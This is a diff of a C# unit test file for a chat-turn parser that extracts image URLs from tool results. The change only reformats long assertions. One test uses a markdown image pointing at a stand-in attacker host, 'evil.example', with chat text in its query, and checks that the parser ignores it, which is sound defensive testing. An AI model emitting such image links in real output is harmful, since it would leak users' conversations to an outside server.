@@ -35,13 +35,16 @@ public class TurnStreamImageTests
             InSubSession("d1", ToolUse("c1", "FetchUrl")),
             InSubSession("d1", ToolResult("c1", Page)));
 
-        Assert.That(turn.Blocks[0].SubTurn!.Blocks[0].Images, Is.EqualTo(new[] { "https://example.co.za/bobotie.jpg" }));
+        Assert.That(turn.Blocks[0].SubTurn!.Blocks[0].Images,
+            Is.EqualTo(new[] { "https://example.co.za/bobotie.jpg" }));
         Assert.That(turn.Blocks[0].Images, Is.Empty, "the parent's own call has none");
     }
 
     [Test]
     public void APlainLink_IsNoImage() =>
-        Assert.That(Apply(ToolUse("c1", "FetchUrl"), ToolResult("c1", "See [the page](https://example.co.za/bobotie)")).Blocks[0].Images, Is.Empty);
+        Assert.That(
+            Apply(ToolUse("c1", "FetchUrl"), ToolResult("c1", "See [the page](https://example.co.za/bobotie)"))
+                .Blocks[0].Images, Is.Empty);
 
     [Test]
     public void AFailedResult_GivesNone() =>
@@ -49,5 +52,7 @@ public class TurnStreamImageTests
 
     [Test]
     public void TheResultOfADelegationCall_GivesNone_BecauseItIsTheSpecialistsAnswerNotWhatAToolRead() =>
-        Assert.That(Apply(ToolUse("d1", "StartSubSession"), ToolResult("d1", "![Bobotie](https://evil.example/?q=the+chat)")).Blocks[0].Images, Is.Empty);
+        Assert.That(
+            Apply(ToolUse("d1", "StartSubSession"), ToolResult("d1", "![Bobotie](https://evil.example/?q=the+chat)"))
+                .Blocks[0].Images, Is.Empty);
 }
